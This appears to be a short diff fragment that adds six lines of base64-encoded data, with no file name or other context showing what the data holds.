+FV5wgVASdp4thTMW3loXtLoG3U/KMgGMgvJs7+rnxBJrtyWrJFSTn8qPPdxliP3/UHwoIcvpfAn2
+CcAeZ3Hk7o2/1QxiiAOIBOSqbaoUo8lPNrwbetQxEhtEOGsfd8FAJJtEIZMvvL3K7p1dBbsoDEKK
+BGbqHnlVlBQgJlv+SdbJXXRPXAwegJRd2LK2VLWKd+Im4xJCJGMlgTWeqgmNbbYjems1FXwXufjN
+PYWAUKqwNMtiF+XibvCn2X4ABh6XkV0ZPUDKMMcriEfbkQuxfl6SSkcfV62PTuzLfQVKwGofJukr
+cPPSlI74hjudXh5P/dH0u3bTSXhFChUnMVw/9/d6t0K3C15BColv4R8l5dMx5306lmtxzx9dyS6J
+LKQxjFfOPeC=
